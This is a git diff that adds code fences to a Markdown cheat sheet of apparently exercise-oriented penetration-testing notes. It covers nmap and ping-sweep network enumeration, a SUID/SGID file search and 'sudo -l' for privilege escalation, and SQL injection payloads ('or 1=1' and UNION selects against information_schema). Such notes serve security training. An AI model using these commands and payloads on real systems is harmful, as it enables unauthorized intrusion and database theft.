@@ -1,11 +1,13 @@
 ## Dry Run Notes
 
 ### Network Enumeration
+```
 	nmap -v -sT -Pn -T4 -sV <ipaddr>,<ipaddr_2>
-	
+```
+```
 	whereis ping = <path>/ping
 	for i in {1..254}; do (/<path>/ping -c 1 192.168.1.$i | grep "bytes from" &); done
-	
+```	
 ### Host Enumeration
 	0) File Enum
 		/etc/hosts
@@ -17,8 +19,9 @@
 		
 	2) Priv Esc via SUDO / SUID / SGID
 		i)	X = 4000 (SUID) : 2000 (SGID) : 6000 (Either / Both )
+```
 			find / -type f -perm /X -ls 2>/dev/null
-		
+```	
 		ii) 	sudo -l
 	
 	3) Situational Awareness
@@ -38,8 +41,9 @@
 			Selection=2 or 1=1; #
 		
 		Check tables
+```
 			<category>=<#> UNION sellect 1,2,3,...X ;
-		
+```	
 		Golden Statment
 			UNION select <>,<>,<> from information_schema.columns ; #make it reflect as database,table,col.
 			UNION select <column>,<column2>,..,<columnX> from <database>.<table>
